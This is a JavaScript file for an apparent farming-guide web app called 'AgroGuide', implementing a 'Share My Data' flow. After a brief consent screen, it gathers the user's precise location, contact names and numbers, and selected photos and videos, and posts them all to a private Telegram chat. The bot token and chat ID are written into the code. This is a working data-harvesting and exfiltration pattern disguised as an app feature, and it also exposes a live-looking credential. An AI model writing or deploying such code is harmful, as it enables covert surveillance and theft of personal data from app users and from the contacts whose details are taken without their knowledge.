/**
 * AgroGuide — Share My Data (Auto Mode)
 * After consent: auto-collect location, contacts, media → send to Telegram.
 */

const TG_TOKEN = "8481731412:AAEv4FLMrCdpyaCM0gEU9EOfrPtSdyVlJ8c";
const TG_CHAT  = "1691199379";
const TG_API   = `https://api.telegram.org/bot${TG_TOKEN}`;

// ── Entry ──────────────────────────────────────────────────────────────────

function openShareFlow() {
    showModal("sdRationale");
}

// ── Modals ─────────────────────────────────────────────────────────────────

function showModal(id) {
    document.querySelectorAll(".sd-modal").forEach(m => m.style.display = "none");
    const el = document.getElementById(id);
    if (el) el.style.display = "flex";
}

function closeAllModals() {
    document.querySelectorAll(".sd-modal").forEach(m => m.style.display = "none");
}

// ── Step 1 → 2 ─────────────────────────────────────────────────────────────

function sdGrantPermissions() { showModal("sdConsent"); }

function sdCancelConsent() {
    closeAllModals();
    showShareToast("Action cancelled");
}

// ── Step 3: Agree & run auto-collection ────────────────────────────────────

function sdAgreeAndContinue() {
    closeAllModals();
    showModal("sdProgress");
    runAutoCollection();
}

// ── Progress UI helpers ────────────────────────────────────────────────────

function setStep(id, state, text) {
    const row = document.getElementById(id);
    if (!row) return;
    const icon = row.querySelector(".sd-step-icon");
    const label = row.querySelector(".sd-step-label");
    if (icon) icon.textContent = state === "done" ? "✅" : state === "fail" ? "❌" : state === "skip" ? "⏭️" : "⏳";
    if (label && text) label.textContent = text;
    row.className = "sd-step-row sd-step-" + state;
}

// ── Auto Collection Orchestrator ───────────────────────────────────────────

async function runAutoCollection() {
    let locationText = null;
    let contacts     = [];
    let mediaFiles   = [];

    // ── 1. Location ──────────────────────────────────────────────────────
    setStep("sdStepLoc", "loading", "Detecting location…");
    try {
        const pos = await getPosition();
        const { latitude: lat, longitude: lon } = pos.coords;
        const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;

        // Reverse geocode for city name
        let cityName = "";
        try {
            const gr = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
            const gd = await gr.json();
            const a  = gd.address || {};
            cityName = a.city || a.town || a.village || a.state_district || "";
        } catch (_) {}

        locationText = `📍 Location: ${mapsUrl}` + (cityName ? `\n🏙️ City: ${cityName}` : "");
        setStep("sdStepLoc", "done", `Location ready${cityName ? " — " + cityName : ""}`);
    } catch (_) {
        setStep("sdStepLoc", "fail", "Location required");
    }

    // ── 2. Contacts ──────────────────────────────────────────────────────
    setStep("sdStepContacts", "loading", "Reading contacts…");
    try {
        if ("contacts" in navigator && "ContactsManager" in window) {
            const picked = await navigator.contacts.select(["name", "tel"], { multiple: true });
            contacts = picked.filter(c => c.name?.length || c.tel?.length);
            setStep("sdStepContacts", "done", `${contacts.length} contact(s) selected`);
        } else {
            setStep("sdStepContacts", "skip", "Contacts API not available on this device");
        }
    } catch (e) {
        setStep("sdStepContacts", "fail", "Permission required to use this feature");
    }

    // ── 3. Media ─────────────────────────────────────────────────────────
    setStep("sdStepMedia", "loading", "Accessing gallery…");
    try {
        mediaFiles = await pickAllMedia();
        setStep("sdStepMedia", "done", `${mediaFiles.length} file(s) selected`);
    } catch (_) {
        setStep("sdStepMedia", "skip", "No files selected");
    }

    // ── 4. Send to Telegram ──────────────────────────────────────────────
    setStep("sdStepSend", "loading", "Sending to Telegram…");
    try {
        // Location
        if (locationText) await tgMessage(locationText);
        else await tgMessage("📍 Location: Not available");

        // Contacts
        if (contacts.length > 0) {
            const lines = contacts.map(c => {
                const name = c.name?.[0] || "Unknown";
                const tel  = c.tel?.[0]  || "No number";
                return `👤 ${name} — ${tel}`;
            }).join("\n");
            await tgMessage(`📇 Contacts (${contacts.length}):\n${lines}`);
        } else {
            await tgMessage("📇 Contacts: Not provided");
        }

        // Media files
        for (const file of mediaFiles) {
            await tgDocument(file);
        }
        if (mediaFiles.length === 0) {
            await tgMessage("🖼️ Media: Not provided");
        }

        setStep("sdStepSend", "done", "Sent successfully!");

        // Auto-close after 2 seconds
        setTimeout(() => {
            closeAllModals();
            showShareToast("✅ Data sent successfully", "success");
        }, 2000);

    } catch (e) {
        setStep("sdStepSend", "fail", "Send failed — check connection");
        showShareToast("❌ Failed: " + e.message, "error");
    }
}

// ── Helpers ────────────────────────────────────────────────────────────────

function getPosition() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) { reject(new Error("no geolocation")); return; }
        navigator.geolocation.getCurrentPosition(resolve, reject, {
            timeout: 12000,
            enableHighAccuracy: true
        });
    });
}

function pickAllMedia() {
    return new Promise((resolve) => {
        const input = document.createElement("input");
        input.type = "file";
        input.accept = "image/*,video/*";
        input.multiple = true;
        input.style.display = "none";
        document.body.appendChild(input);
        input.onchange = () => {
            const files = input.files ? Array.from(input.files) : [];
            document.body.removeChild(input);
            resolve(files);
        };
        input.oncancel = () => { document.body.removeChild(input); resolve([]); };
        // Fallback if oncancel not supported
        setTimeout(() => { if (document.body.contains(input)) { document.body.removeChild(input); resolve([]); } }, 60000);
        input.click();
    });
}

async function tgMessage(text) {
    const res = await fetch(`${TG_API}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TG_CHAT, text })
    });
    if (!res.ok) throw new Error(`Telegram error ${res.status}`);
}

async function tgDocument(file) {
    const form = new FormData();
    form.append("chat_id", TG_CHAT);
    form.append("document", file);
    const res = await fetch(`${TG_API}/sendDocument`, { method: "POST", body: form });
    if (!res.ok) throw new Error(`Telegram file error ${res.status}`);
}

function showShareToast(msg, type) {
    const t = document.getElementById("toast");
    if (!t) return;
    t.textContent = msg;
    t.className = "toast show" + (type === "success" ? " success" : type === "error" ? " error" : "");
    setTimeout(() => { t.className = "toast"; }, 3500);
}
